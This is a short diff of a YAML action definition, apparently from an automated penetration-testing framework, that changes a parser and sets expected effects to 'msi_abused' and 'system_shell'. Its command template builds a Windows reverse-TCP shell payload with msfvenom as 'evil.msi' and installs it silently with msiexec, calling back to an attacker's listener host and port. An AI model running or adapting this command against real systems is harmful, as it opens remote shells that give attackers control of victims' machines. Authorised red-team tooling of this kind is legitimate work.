@@ -7,9 +7,10 @@ parameters:
   target_ip: from_engagement.target_ip
 command_template: msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport}
   -f msi -o evil.msi && msiexec /quiet /qn /i evil.msi
-parser: null
+parser: generic_parser
 expected_effects:
-- action_completed
+- msi_abused
+- system_shell
 falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
